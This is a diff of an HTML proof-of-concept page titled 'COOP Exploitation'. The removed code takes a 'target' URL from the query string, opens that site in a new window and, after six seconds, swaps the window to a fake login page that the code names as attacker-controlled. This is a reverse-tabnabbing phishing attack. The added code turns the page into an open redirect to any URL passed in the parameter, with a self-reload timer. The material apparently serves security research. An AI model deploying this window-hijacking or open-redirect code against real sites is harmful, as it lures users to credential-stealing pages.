@@ -3,7 +3,7 @@
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>COOP Exploitation</title>
+        <title>COOP Exploitation Test</title>
         <style>
             body {
                 background-color: white;
@@ -54,78 +54,47 @@
             }
         </style>
         <script type="text/javascript">
-            let foo; // Declare globally
-
             function isValidUrl(url) {
-                // Basic validation for the URL to prevent malicious redirects
-                const pattern = /^(https?:\/\/)[\w\-]+\.[\w\-]+(?:\.[a-z]{2,})?/;
+                // Strict validation for security
+                const pattern = /^(https?:\/\/)(([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,})(\/[^\s]*)?$/;
                 return pattern.test(url);
             }
     
-            function tParam(qParam) {
-                const frmURL = window.location.search.substring(1);
-                const varURL = frmURL.split('&');
-                for (let i = 0; i < varURL.length; i++) {
-                    const vParam = varURL[i].split('=');
-                    if (vParam[0] === qParam) {
-                        return decodeURIComponent(vParam[1]);
-                    }
-                }
-                console.warn("Target parameter missing. Redirecting...");
-                return null;
-            }
-            
-            function init() {
-                if (foo) {
-                    console.log("Redirecting to the attacker's controlled site");
-                    foo.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
-                } else {
-                    console.error("Window object not found, redirection failed.");
-                }
-            }
-            
-            function launch() {
-                const target = tParam("target");
-                if (!target || !isValidUrl(target)) {
-                    console.error("Invalid or missing target URL. Redirection will not happen.");
-                    return;
-                }
-                foo = window.open(target, "_blank");
-                if (foo) {
-                    console.log("Target site opened successfully:", target);
-                    setTimeout(init, 6000);
-                } else {
-                    console.error("Popup blocked or failed to open.");
-                    displayErrorMessage();
-                }
+            function getTargetParam() {
+                const params = new URLSearchParams(window.location.search);
+                return params.get("target") ? decodeURIComponent(params.get("target")) : null;
             }
 
-            function displayErrorMessage() {
-                const message = document.createElement('div');
-                message.id = 'error-message';
-                message.innerHTML = `
-                    <p>Popup blocked or redirection failed. Try clicking below:</p>
-                    <a class="manual-link" href="${tParam('target')}" target="_blank">Click here to visit the target</a>
-                `;
-                document.body.appendChild(message);
+            function redirect() {
+                const target = getTargetParam();
+                if (!target || !isValidUrl(target)) {
+                    console.error("Invalid or missing target URL. Aborting redirection.");
+                    return;
+                }
+
+                console.log(`Redirecting to: ${target}`);
+                window.location.href = target;
             }
 
             function setup() {
-                const target = tParam("target");
-                if (!target) {
-                    console.error("Target parameter is missing.");
-                    return;
-                }
-                document.body.addEventListener('click', launch);
-                const message = document.createElement('div');
-                message.id = 'message';
-                message.innerText = `If the site did not automatically redirect to ${target}, click anywhere on the white background.`;
-                document.body.appendChild(message);
-                launch();
+                setTimeout(() => {
+                    console.log("Refreshing page...");
+                    location.reload();
+                }, 5000); // Refresh after 5 seconds
+                
+                setTimeout(redirect, 3000); // Redirect after 3 seconds
             }
-            
+
             window.onload = setup;
         </script>
     </head>
     <body>
-        <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;929e782ace685def&quot;,&quot;version&quot;:&quot;2025.3.0&quot;,&quot;r
+        <div class="redirect-container">
+            <div class="loader"></div>
+            <p class="message">Redirecting... Please wait.</p>
+            <p class="secondary-message">
+                If the site does not redirect, <a class="manual-link" href="#" id="manual-redirect">click here</a>.
+            </p>
+        </div>
+    </body>
+</html>
